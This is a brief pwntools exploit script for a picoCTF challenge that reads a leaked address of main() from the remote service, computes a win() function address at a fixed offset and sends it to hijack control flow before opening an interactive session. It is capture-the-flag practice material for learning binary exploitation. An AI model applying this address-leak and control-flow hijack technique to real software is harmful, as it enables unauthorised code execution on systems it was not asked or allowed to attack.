from pwn import *

p=remote('rescued-float.picoctf.net',62684)

context.binary = exe = ELF('./vuln',checksec=False)
p.recvuntil(b'main: ')
main_address = int(p.recvline().strip(),16)
win_address = main_address - 0x96
p.sendline(hex(win_address))
p.interactive()
